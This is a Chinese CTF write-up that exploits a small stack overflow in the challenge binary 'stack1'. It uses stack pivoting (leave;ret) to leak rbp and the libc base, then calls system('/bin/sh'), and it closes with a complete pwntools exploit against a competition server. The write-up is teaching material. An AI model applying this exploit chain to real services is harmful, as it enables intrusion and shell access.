## 准备步骤

```sh
checksec stack1

#    Arch:     amd64-64-little
#    RELRO:    Partial RELRO
#    Stack:    No canary found
#    NX:       NX enabled
#    PIE:      No PIE (0x3fe000)
```

ida检查，发现漏洞，在`sub_400676()`中有16个字节的溢出

```c
int sub_400676()
{
  char buf[80]; // [rsp+0h] [rbp-50h] BYREF

  memset(buf, 0, sizeof(buf));
  putchar('>');
  read(0, buf, 96uLL);      //溢出
  return puts(buf);
}
```

但这是64为程序，且溢出只能覆盖`rbp`和返回地址，这就导致不能一次性构造参数并调用。我们可以考虑进行**栈迁移**，把执行流的栈转到别的地方。

## 栈迁移原理

### 条件
栈迁移主要是针对溢出长度不够，无法进行传参（比如本题只够覆盖rbp和返回地址），但需要可以覆盖到rbp以迁移栈。

### 关键指令 `leave;ret;`

`leave` 指令可以看成两条指令 `mov rsp,rbp; pop rbp;` ，可以看出这条指令原本是用来还原调用函数前的栈帧的，但如果我们提前改变`rbp` 的值，譬如，改成比现在 `rsp` 地址还低的位置（即栈的高处），那么在执行语句之后栈帧就在上方，可以利用之前在栈中写入的数据（题中的 `buffer` ）控制程序流程了。

如果不清楚的话，可再看看这篇文章：[栈迁移的原理&&实战运用](https://www.cnblogs.com/ZIKH26/articles/15817337.html)

## 构造payload

### 泄露`rbp`

因为我们要修改`rbp`，所以我们要先知道原来`rbp`的值，再在其基础上进一步修改。

```python
print(conn.recv(1))
payload1=b"a"*80
conn.send(payload1)
old_rbp_addr=int.from_bytes(conn.recv()[80:86],'little')# >
```

如果rbp的低位中没有`\x00`的话，puts就会将80个a和`rbp`打印出来，截取6个字符是因为64位的栈从`0x7f??????????` 开始，前面有两个`\x00`字符，puts打印不出来

### 泄露libc基址

我们gdb一下

```sh
gdb stack1
b *0x0000000000400710   #这是主循环函数sub_400676()的入口
r
s                       #单步进入函数sub_400676()
n
```

```gdb
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
   0x400676    push   rbp
 ► 0x400677    mov    rbp, rsp
   0x40067a    sub    rsp, 0x50
   0x40067e    lea    rdx, [rbp - 0x50]
   0x400682    mov    eax, 0
   0x400687    mov    ecx, 0xa
   0x40068c    mov    rdi, rdx
   0x40068f    rep stosq qword ptr [rdi], rax
    ↓
   0x40068f    rep stosq qword ptr [rdi], rax

───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd7c0 —▸ 0x7fffffffd7e0 —▸ 0x400730 ◂— 0x41ff894156415741
01:0008│     0x7fffffffd7c8 —▸ 0x400715 ◂— 0xb890f0eb0274c085
02:0010│     0x7fffffffd7d0 —▸ 0x7fffffffd8c8 —▸ 0x7fffffffdb6f ◂— '/home/kali/ctf/pwn/q29_stack1/stack1'
03:0018│     0x7fffffffd7d8 ◂— 0x100000000
04:0020│ rbp 0x7fffffffd7e0 —▸ 0x400730 ◂— 0x41ff894156415741
05:0028│     0x7fffffffd7e8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov edi, eax
06:0030│     0x7fffffffd7f0 ◂— 0x1
07:0038│     0x7fffffffd7f8 —▸ 0x7fffffffd8c8 —▸ 0x7fffffffdb6f ◂— '/home/kali/ctf/pwn/q29_stack1/stack1'
```

其中`0x7fffffffd7c8` 是新建栈帧返回地址所在，`0x7fffffffd7c0` 是原来rbp地址所在，值为`0x7fffffffd7e0` 再加上buffer的0x50大小，就可以计算新rbp及栈顶的位置了

```python
now_rbp_addr=old_rbp_addr-0x20
now_esp_addr=now_rbp_addr-0x50
return_addr2=0x0000000000400710  #call            rbp_3|  rbp_2          normal_ret
payload2=p64(now_rbp_addr)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(return_addr2)+b'a'*(0x50-0x8*5)+p64(now_esp_addr)+p64(leave_addr)
conn.send(payload2)
puts_addr=int.from_bytes(conn.recvuntil(b'\x7f\x0a\x3e')[-8:-2],'little')
```

这个payload将新栈帧转到原来的栈顶并执行传参和对puts的调用

### Pwn it！

计算binsh和system真实地址

```python
libcbase=puts_addr-puts_libc
abinsh_addr=libcbase+abinsh_libc
system_addr=libcbase+system_libc
```

与上一步相同的方法构造新栈帧

```python
now_ebp_addr-=56
now_esp_addr=now_ebp_addr-0x50
payload3=b'a'*8+p64(rdi_addr)+p64(abinsh_addr)+p64(system_addr)+b'a'*(0x50-0x8*4)+p64(now_esp_addr)+p64(leave_addr) #前面8个a是新的rbp，但不过这个rbp已经没用了，所以可以随便填
conn.send(payload3)
conn.interactive()
```

## exp

```python
from pwn import *
ip="124.16.75.117"
port=51001
conn=connect(ip,port)
#conn=process("./pwn/q29_stack1/stack1")
#conn=gdb.debug('./pwn/q29_stack1/stack1','b *0x00000000004006C4')
libc=ELF('./pwn/q29_stack1/libc.so.6')
puts_libc=libc.sym['puts']
system_libc=libc.sym['system']
abinsh_libc=libc.search(b'/bin/sh').__next__()
context.log_level="debug"

leave_addr=0x00000000004006BE
rdi_addr=0x0000000000400793
puts_got=0x0000000000601020
puts_plt=0x0000000000400530

#***************1***************
print("111111111111111111111111")
print(conn.recv(1))
payload1=b"a"*80
conn.send(payload1)
old_ebp_addr=int.from_bytes(conn.recv()[80:86],'little')# > is here
print(hex(old_ebp_addr))

#***************2***************
print("222222222222222222222222")
now_ebp_addr=old_ebp_addr-0x20
now_esp_addr=now_ebp_addr-0x50
return_addr2=0x0000000000400710  #call            ebp_3|  ebp_2          normal_ret
payload2=p64(now_ebp_addr)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(return_addr2)+b'a'*(0x50-0x8*5)+p64(now_esp_addr)+p64(leave_addr)
conn.send(payload2)
puts_addr=int.from_bytes(conn.recvuntil(b'\x7f\x0a\x3e')[-8:-2],'little')

libcbase=puts_addr-puts_libc
abinsh_addr=libcbase+abinsh_libc
system_addr=libcbase+system_libc
print(hex(puts_addr),hex(libcbase))


#****************3***************
print("33333333333333333333333")
now_ebp_addr-=56
now_esp_addr=now_ebp_addr-0x50
payload3=b'a'*8+p64(rdi_addr)+p64(abinsh_addr)+p64(system_addr)+b'a'*(0x50-0x8*4)+p64(now_esp_addr)+p64(leave_addr)
conn.send(payload3)
conn.interactive()
```

